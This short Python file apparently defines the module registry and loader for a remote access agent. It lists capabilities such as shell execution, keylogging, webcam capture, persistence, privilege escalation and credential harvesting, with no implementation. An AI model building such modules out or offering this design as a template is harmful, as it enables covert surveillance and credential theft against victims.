"""Module registry and parameter definitions."""
MODULES = {
    "shell": {"name": "Interactive Shell", "description": "Execute shell commands", "params": ["command"]},
    "screenshot": {"name": "Screenshot", "description": "Capture display", "params": []},
    "keylogger": {"name": "Keylogger", "description": "Capture keystrokes", "params": ["duration_seconds"]},
    "webcam": {"name": "Webcam Capture", "description": "Capture webcam image", "params": []},
    "persist": {"name": "Persistence", "description": "Install persistence mechanism", "params": ["method"]},
    "elevate": {"name": "Privilege Escalation", "description": "Attempt privilege escalation", "params": ["method"]},
    "recon": {"name": "Reconnaissance", "description": "System enumeration", "params": []},
    "creds": {"name": "Credential Harvest", "description": "Harvest credentials", "params": ["target"]},
    "files": {"name": "File Manager", "description": "Browse files", "params": ["path", "action"]},
    "upload": {"name": "Upload File", "description": "Upload to agent", "params": ["destination"]},
    "download": {"name": "Download File", "description": "Download from agent", "params": ["source"]},
}

class ModuleLoader:
    def __init__(self, persist=None):
        self.persist = persist
        self.modules = MODULES

    def list_modules(self):
        return self.modules

    def get_module(self, name):
        return self.modules.get(name)
